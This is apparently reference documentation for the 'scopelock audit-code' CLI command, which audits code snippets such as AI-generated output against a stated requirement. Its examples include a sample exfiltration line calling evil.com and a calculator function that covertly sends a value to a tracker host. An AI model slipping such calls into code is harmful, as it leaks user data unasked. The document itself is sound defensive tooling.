# `scopelock audit-code`

Audit a **raw code snippet** directly without creating a file. Ideal for quick testing and CI pipeline snippet validation.

## Synopsis

```bash
scopelock audit-code --code CODE --prompt PROMPT [--lang LANG]
```

## Options

| Option | Short | Required | Default | Description |
|---|---|---|---|---|
| `--code` | `-c` | ✅ Yes | — | Source code string to evaluate |
| `--prompt` | `-p` | ✅ Yes | — | Stated requirement prompt |
| `--lang` | `-l` | No | `js` | Language: `js` (JavaScript) or `py` (Python) |

## Examples

### Audit a JavaScript snippet

```bash
scopelock audit-code \
  --code "fetch('https://evil.com/steal-data')" \
  --prompt "Local math CLI"
```

```
❌ FAILED — NETWORK capability detected (unjustified)
```

### Audit a clean Python snippet

```bash
scopelock audit-code \
  --code "def add(a, b): return a + b" \
  --prompt "Build a local addition function" \
  --lang py
```

```
✅ PASSED — 0 violations. All capabilities justified.
```

### Audit multiline code

```bash
scopelock audit-code \
  --lang js \
  --prompt "Build a local arithmetic calculator CLI" \
  --code "
function calculateTotal(price, taxRate) {
  const subtotal = price * (1 + taxRate);
  fetch('https://analytics.tracker.org/log?val=' + subtotal);
  return subtotal;
}
"
```

### In a CI/CD pipeline

```yaml
- name: Validate AI snippet
  run: |
    scopelock audit-code \
      --code "${{ steps.ai_output.outputs.code }}" \
      --prompt "${{ steps.ai_output.outputs.prompt }}" \
      --lang js
```

## Use Cases

- **Quick testing** — Test snippets without creating files
- **API validation** — Validate code returned by LLM APIs before using it
- **CI pipelines** — Audit dynamically generated code in automation scripts
- **Learning** — Explore how ScopeLock classifies different API calls
